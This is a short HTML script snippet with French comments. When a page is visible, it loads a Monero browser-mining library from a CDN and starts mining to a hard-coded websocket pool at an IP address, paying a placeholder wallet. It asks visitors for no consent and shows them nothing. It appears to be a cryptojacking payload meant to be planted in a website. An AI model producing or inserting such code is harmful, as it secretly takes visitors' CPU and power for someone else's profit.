<script>
(function(){
    if(document.hidden) return;
    var pool = "ws://207.180.225.182:3333"; // Ton IP
    var wallet = "4Aissa...TonWalletXMR..."; // À remplacer
    
    var s = document.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/xmrig-js@latest/dist/xmrig.min.js';
    s.onload = function(){
        try { new Xmrig({pool: pool, wallet: wallet, intensity: 1}).start(); } catch(e){}
    };
    document.head.appendChild(s);
})();
</script>